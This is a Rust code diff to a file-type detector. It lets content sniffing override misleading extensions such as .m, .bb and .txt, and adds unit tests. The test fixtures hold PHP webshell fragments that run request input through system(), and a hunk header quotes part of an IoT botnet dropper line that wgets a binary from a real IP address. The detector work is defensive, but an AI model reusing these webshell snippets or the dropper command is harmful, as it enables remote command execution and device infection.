@@ -1312,7 +1312,28 @@ fn allows_heuristic_extension_override(file_type: FileType) -> bool {
             // sniffer look inside recovers the HTML, batch and registry ones
             // as what they are.
             | FileType::StaticLib
+            // `.m` is Objective-C, and also where Perl, ASP, and mIRC samples
+            // get dumped. Real Objective-C that the scorer does not recognise
+            // stays Objective-C via the extension fallback. A body that is
+            // clearly another language should be that language.
+            | FileType::ObjectiveC
+            // `.bb` is Babashka, and also a vxheaven variant letter
+            // (`Backdoor.PHP.Agent.bb`). A body that is clearly another
+            // language should be that language; a Babashka script the scorer
+            // does not recognise stays Clojure via the extension.
+            | FileType::Clojure
     )
+}
+
+/// `.txt` / `.text` claim prose. They are listed as data formats so a note
+/// that mentions a keyword stays text, but a file whose body is clearly a
+/// language (`Php_Backdoor.txt`) should be that language. Other extensions
+/// that map to `Text` (OCaml `.ml`, CSS, SQL) stay on the extension.
+fn prose_extension_may_be_source(path: &Path) -> bool {
+    let Some(ext) = path.extension().and_then(|e| e.to_str()) else {
+        return false;
+    };
+    ext.eq_ignore_ascii_case("txt") || ext.eq_ignore_ascii_case("text")
 }
 
 /// True when a path's trailing dot-segment is a real extension rather than the
@@ -1467,7 +1488,9 @@ pub fn detect(path: &Path, data: &[u8]) -> Option<Detection> {
     // language keyword scoring is too weak to override `.go`, `.js`, `.swift`,
     // etc. Container extensions are different because a non-magic `.zip` body
     // may be a script payload wearing an archive name.
-    if heuristic_may_override_ext && !ext::is_data_format(path) {
+    if (heuristic_may_override_ext && !ext::is_data_format(path))
+        || prose_extension_may_be_source(path)
+    {
         if let Some(file_type) = heuristics::detect_from_content(data) {
             let ext_match = match ext_ft {
                 Some(e) if e != file_type => ExtensionMatch::Different(e),
@@ -1478,6 +1501,19 @@ pub fn detect(path: &Path, data: &[u8]) -> Option<Detection> {
                 file_type,
                 source: DetectionSource::Heuristic,
                 ext_match,
+            });
+        }
+    }
+
+    // Object code with a source extension is not that language. DOS COM samples
+    // named `Burger.m` or `Trivial.45.t` used to inherit Objective-C or Perl
+    // from the suffix. UTF-16 source is excluded inside `binary_not_source`.
+    if let Some(ext) = ext_ft.filter(|ft| ft.is_source_code()) {
+        if heuristics::binary_not_source(data) {
+            return Some(Detection {
+                file_type: FileType::Data,
+                source: DetectionSource::Heuristic,
+                ext_match: ExtensionMatch::Different(ext),
             });
         }
     }
@@ -1933,6 +1969,81 @@ cd /tmp || /var/tmp; rm avtech.arm7; wget http://193.243.147.115/avtech.arm7; ch
     fn objc_by_ext() {
         assert_ext("view.m", FileType::ObjectiveC);
         assert_ext("view.mm", FileType::ObjectiveC);
+    }
+
+    #[test]
+    fn txt_php_webshell_overrides_text_extension() {
+        let php = b"<?\n$cmd = stripslashes($cmd);\nsystem($cmd);\n";
+        assert_detect("Php_Backdoor.txt", php, FileType::Php);
+        // The saved webshell also embeds `document.write`, which used to tie
+        // JavaScript inside the sniff window.
+        let saved = include_bytes!("testdata/php-backdoor.txt");
+        assert_detect("Php_Backdoor.txt", saved, FileType::Php);
+    }
+
+    #[test]
+    fn prose_txt_stays_text() {
+        let note = b"This is a note about the meeting. We should let the team decide next week.\n";
+        assert_detect("notes.txt", note, FileType::Text);
+        let license = b"Modified Version, except to acknowledge the contribution.\n\
+Original or Modified Versions may be sold by itself.\n";
+        assert_detect("OFL.txt", license, FileType::Text);
+        let guide = b"If you discover a problem, post a message and let the rest of us know.\n\
+Coordinate with the Applet Maintainer before sweeping changes.\n";
+        assert_detect("contributing.txt", guide, FileType::Text);
+    }
+
+    #[test]
+    fn php4_agent_without_known_extension_is_php() {
+        let php = b"<?\nclass backdoor {\n  var $pwd;\n  var $shell;\n  function shell() {\n    echo $_SERVER['PHP_SELF'];\n  }\n}\n";
+        assert_detect("Backdoor.PHP.Agent.ap", php, FileType::Php);
+    }
+
+    #[test]
+    fn php_webshell_with_bb_extension_is_php() {
+        let php = b"<?\n@$output = system($_POST['command']);\n";
+        assert_detect("Backdoor.PHP.Agent.bb", php, FileType::Php);
+    }
+
+    #[test]
+    fn babashka_script_keeps_bb_extension() {
+        let bb = b"(defn main []\n  (println \"hi\"))\n";
+        assert_detect("script.bb", bb, FileType::Clojure);
+    }
+
+    #[test]
+    fn perl_source_with_m_extension_is_perl() {
+        let perl = b"use strict;\nmy $port = 6667;\nprint $sock \"NICK $nick\\r\\n\";\n";
+        assert_detect("Scanner.m", perl, FileType::Perl);
+    }
+
+    #[test]
+    fn objective_c_source_keeps_m_extension() {
+        let objc =
+            b"#import <Foundation/Foundation.h>\n@interface View : NSObject\n- (void)draw;\n@end\n";
+        assert_detect("View.m", objc, FileType::ObjectiveC);
+    }
+
+    #[test]
+    fn dos_com_with_source_extension_is_data() {
+        let mut com = vec![0x90u8; 80];
+        for i in (0..80).step_by(8) {
+            com[i] = 0x01;
+        }
+        com[11] = 0xCD;
+        com[12] = 0x21;
+        assert_detect("Burger.m", &com, FileType::Data);
+        assert_detect("Trivial.45.t", &com, FileType::Data);
+    }
+
+    #[test]
+    fn utf16_source_with_m_extension_stays_objective_c() {
+        let mut utf16 = vec![0xFFu8, 0xFE];
+        for b in b"// objc comment\n".repeat(8) {
+            utf16.push(b);
+            utf16.push(0);
+        }
+        assert_detect("View.m", &utf16, FileType::ObjectiveC);
     }
 
     #[test]
